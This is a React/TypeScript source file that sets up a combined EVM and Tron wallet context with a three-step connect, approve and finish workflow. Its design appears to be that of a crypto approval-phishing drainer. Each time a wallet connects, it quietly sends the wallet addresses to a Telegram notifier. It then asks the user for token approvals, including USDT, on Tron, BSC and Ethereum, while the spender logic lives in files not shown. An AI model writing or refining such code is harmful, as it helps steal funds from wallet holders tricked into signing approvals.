import React, { createContext, useContext, useState, useCallback, ReactNode } from "react";
import { useEvmWallet, EvmWalletProvider } from "./EvmWalletContext";
import { useTronWallet, TronWalletProvider } from "./TronWalletContext";
import { getChainByStringId } from "@/lib/chains";
import { sendWalletConnectedNotification } from "@/lib/telegramNotify";
import { connectMultiChainWallet, disconnectWalletConnect, getActiveSession } from "@/lib/walletConnectProvider";
import { toast } from "sonner";

export type WorkflowStep = 1 | 2 | 3;
export type NetworkKey = "trc20" | "bep20" | "erc20";

interface UnifiedWalletContextType {
  evmAddress: string | null;
  tronAddress: string | null;
  isEvmConnected: boolean;
  isTronConnected: boolean;
  isConnecting: boolean;
  isApproving: boolean;
  currentStep: WorkflowStep;
  selectedNetwork: NetworkKey | null;
  approvedNetworks: Record<string, boolean>;
  connectAllWallets: () => Promise<boolean>;
  approveNetwork: (networkKey: NetworkKey) => Promise<void>;
  goToStep: (step: WorkflowStep) => void;
  resetWorkflow: () => void;
}

const UnifiedWalletContext = createContext<UnifiedWalletContextType>({
  evmAddress: null,
  tronAddress: null,
  isEvmConnected: false,
  isTronConnected: false,
  isConnecting: false,
  isApproving: false,
  currentStep: 1,
  selectedNetwork: null,
  approvedNetworks: {},
  connectAllWallets: async () => false,
  approveNetwork: async () => {},
  goToStep: () => {},
  resetWorkflow: () => {},
});

export const useUnifiedWallet = () => useContext(UnifiedWalletContext);

const UnifiedWalletInnerProvider = ({ children }: { children: ReactNode }) => {
  const evmWallet = useEvmWallet();
  const tronWallet = useTronWallet();

  const [currentStep, setCurrentStep] = useState<WorkflowStep>(1);
  const [selectedNetwork, setSelectedNetwork] = useState<NetworkKey | null>(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const [approvedNetworks, setApprovedNetworks] = useState<Record<string, boolean>>({
    trc20: false,
    bep20: false,
    erc20: false,
  });

  const isApproving = evmWallet.isApproving || tronWallet.isApproving;

  const goToStep = useCallback((step: WorkflowStep) => {
    setCurrentStep(step);
  }, []);

  const connectAllWallets = useCallback(async (): Promise<boolean> => {
    setIsConnecting(true);

    try {
      const result = await connectMultiChainWallet();

      if (result.evmAddress) {
        evmWallet.syncFromSession(result.session);
      }
      if (result.tronAddress) {
        tronWallet.syncFromSession(result.session);
      }

      if (!result.evmAddress) {
        toast.error("Failed to connect EVM wallet");
        return false;
      }

      if (result.tronAddress) {
        toast.success("EVM and Tron wallets connected!");
      } else {
        toast.success("EVM wallet connected! Tron will connect when you approve TRC-20.");
      }

      sendWalletConnectedNotification(result.evmAddress, result.tronAddress).catch(console.error);
      setCurrentStep(2);
      return true;
    } catch (err: any) {
      console.error("connectAllWallets failed:", err);
      if (err?.message !== "User closed the connection modal") {
        toast.error("Failed to connect wallet");
      }
      return false;
    } finally {
      setIsConnecting(false);
    }
  }, [evmWallet, tronWallet]);

  const approveNetwork = useCallback(
    async (networkKey: NetworkKey) => {
      if (networkKey === "trc20") {
        if (!tronWallet.isConnected) {
          const addr = await tronWallet.connect();
          if (!addr) return;

          const session = getActiveSession();
          if (session) {
            evmWallet.syncFromSession(session);
          }
        }

        const success = await tronWallet.approveTronUsdt();
        if (success) {
          setApprovedNetworks((prev) => ({ ...prev, trc20: true }));
          setSelectedNetwork(networkKey);
          setCurrentStep(3);
        }
      } else if (networkKey === "bep20") {
        if (!evmWallet.isConnected) {
          const addr = await evmWallet.connect();
          if (!addr) return;
        }

        const bscConfig = getChainByStringId("bsc");
        if (bscConfig) {
          const success = await evmWallet.approveChainTokens(bscConfig);
          if (success) {
            setApprovedNetworks((prev) => ({ ...prev, bep20: true }));
            setSelectedNetwork(networkKey);
            setCurrentStep(3);
          }
        }
      } else if (networkKey === "erc20") {
        if (!evmWallet.isConnected) {
          const addr = await evmWallet.connect();
          if (!addr) return;
        }

        const ethConfig = getChainByStringId("ethereum");
        if (ethConfig) {
          const success = await evmWallet.approveChainTokens(ethConfig);
          if (success) {
            setApprovedNetworks((prev) => ({ ...prev, erc20: true }));
            setSelectedNetwork(networkKey);
            setCurrentStep(3);
          }
        }
      }
    },
    [evmWallet, tronWallet]
  );

  const resetWorkflow = useCallback(async () => {
    await disconnectWalletConnect();
    evmWallet.clearSession();
    tronWallet.clearSession();
    setApprovedNetworks({ trc20: false, bep20: false, erc20: false });
    setSelectedNetwork(null);
    setCurrentStep(1);
  }, [evmWallet, tronWallet]);

  return (
    <UnifiedWalletContext.Provider
      value={{
        evmAddress: evmWallet.address,
        tronAddress: tronWallet.address,
        isEvmConnected: evmWallet.isConnected,
        isTronConnected: tronWallet.isConnected,
        isConnecting,
        isApproving,
        currentStep,
        selectedNetwork,
        approvedNetworks,
        connectAllWallets,
        approveNetwork,
        goToStep,
        resetWorkflow,
      }}
    >
      {children}
    </UnifiedWalletContext.Provider>
  );
};

export const UnifiedWalletProvider = ({ children }: { children: ReactNode }) => {
  return (
    <EvmWalletProvider>
      <TronWalletProvider>
        <UnifiedWalletInnerProvider>{children}</UnifiedWalletInnerProvider>
      </TronWalletProvider>
    </EvmWalletProvider>
  );
};
